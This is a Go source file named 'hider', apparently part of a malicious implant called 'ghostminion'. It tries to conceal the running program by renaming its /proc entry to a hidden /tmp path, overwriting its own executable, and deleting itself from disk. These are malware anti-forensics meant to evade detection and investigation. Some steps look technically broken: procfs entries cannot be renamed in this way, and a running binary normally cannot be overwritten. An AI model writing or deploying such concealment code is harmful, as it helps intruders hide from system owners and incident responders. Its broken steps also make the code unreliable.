package hider

import (
	"ghostminion/logger"
	"os"
	"strconv"
)

var lgr = logger.GetLogger()

func Hide() {
	lgr.Debug("Hiding process begins")
	err := hideProcess()
	if err != nil {
		lgr.Error("Error hiding process:", err.Error())
	}
	err = overwriteExecutable()
	if err != nil {
		lgr.Error("Error overwriting executable:", err.Error())
	}
	err = deleteSelf()
	if err != nil {
		lgr.Error("Error deleting self:", err.Error())
	}
}

func hideProcess() error {
	pid := os.Getpid()
	newName := "/tmp/." + strconv.Itoa(pid)
	oldPath := "/proc/" + strconv.Itoa(pid)
	if err := os.Rename(oldPath, newName); err != nil {
		return err
	}
	return nil
}

func overwriteExecutable() error {
	f, err := os.OpenFile("/proc/self/exe", os.O_WRONLY, 0)
	if err != nil {
		return err
	}
	defer func(f *os.File) {
		err := f.Close()
		if err != nil {

		}
	}(f)

	_, err = f.Write([]byte(" "))
	if err != nil {
		return err
	}
	return nil
}

func deleteSelf() error {
	exe, err := os.Executable()
	if err != nil {
		return err
	}

	err = os.Remove(exe)
	if err != nil {
		return err
	}
	return nil
}
